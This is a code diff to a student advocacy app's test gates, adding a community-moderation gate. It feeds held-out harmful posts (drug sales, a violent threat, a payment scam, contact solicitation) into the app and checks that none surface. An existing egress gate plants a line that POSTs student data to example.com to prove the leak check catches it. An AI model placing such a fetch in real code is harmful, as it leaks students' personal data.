@@ -10,6 +10,7 @@ import { DAYTON_CATALOG } from '../apps/advocate/src/catalog/dayton.js';
 import type { Resource } from '../apps/advocate/src/catalog/types.js';
 import { checkTone } from '../apps/advocate/src/domain/tone.js';
 import { snap } from '../apps/advocate/src/eligibility/engine.js';
+import { Community, moderate } from '../apps/advocate/src/domain/community.js';
 import { SNAP_FY2027 } from '../apps/advocate/src/eligibility/params.js';
 import type { OutboundMessage, Student } from '../apps/advocate/src/domain/types.js';
 import { CONTROL, JOURNEY_DIR, OUT, ROOT, readLock } from './lib.js';
@@ -223,6 +224,22 @@ const egressGate: Gate<Record<string, string>> = {
   falsification: [{ name: 'planted fetch in a domain file', plant: () => ({ 'apps/advocate/src/domain/leak.ts': "await fetch('https://example.com', { method: 'POST', body: JSON.stringify(student) })" }) }],
 };
 
+type CommunityFactory = () => { post: Community['post']; visible: Community['visible'] };
+const HELD_OUT_POSTS = ['DM me 937 555 0111 for answers to the quiz', 'selling xanax and adderall', 'pay me on cash app send $30 first', 'I will beat up him after class', 'free stuff at https://tinyurl.com/x'];
+const moderationGate: Gate<CommunityFactory> = {
+  id: 'community-moderation',
+  protects: 'Harmful or risky posts never surface in the community (PRD COM-5).',
+  definition: def(moderate),
+  check: (make) => {
+    const c = make();
+    const base = { college: 'sinclair', communities: [] as string[], expires: '2026-12-01' };
+    for (const t of HELD_OUT_POSTS) c.post('gate', { ...base, type: 'offer', category: 'help', text: t });
+    const shown = c.visible('sinclair').filter((p) => HELD_OUT_POSTS.includes(p.text));
+    return shown.length ? fail('community-moderation', `${shown.length} harmful posts surfaced`) : pass('community-moderation', `${HELD_OUT_POSTS.length} held-out harmful posts held`);
+  },
+  falsification: [{ name: 'planted community with no filters', plant: () => () => { const posts: { text: string }[] = []; return { post: ((_s: string, p: { text: string }) => (posts.push(p), p)) as unknown as Community['post'], visible: (() => posts) as unknown as Community['visible'] }; } }],
+};
+
 export async function runGates(store?: EvidenceStore): Promise<{ verdicts: Verdict[]; proofs: Proof[] }> {
   const ev = store ?? (mkdirSync(OUT, { recursive: true }), new EvidenceStore(`${OUT}/evidence.db`));
   const proofs: Proof[] = [];
@@ -244,6 +261,7 @@ export async function runGates(store?: EvidenceStore): Promise<{ verdicts: Verdi
   await run(statusGate, onboardingPrompts);
   await run(oracleGate, () => snap as EligFn);
   await run(lockGate, () => ({ lock: readLock() }));
+  await run(moderationGate, () => () => new Community(() => DAY));
   await run(egressGate, () => ({ ...sourceFiles(`${ROOT}apps/advocate/src`), ...sourceFiles(`${ROOT}packages`) }));
   writeFileSync(`${CONTROL}/proofs.json`, `${JSON.stringify(proofs.map(({ gate, gateHash, valid, cases }) => ({ gate, gateHash, valid, cases: cases.map((c) => c.name) })), null, 2)}\n`);
   return { verdicts, proofs };
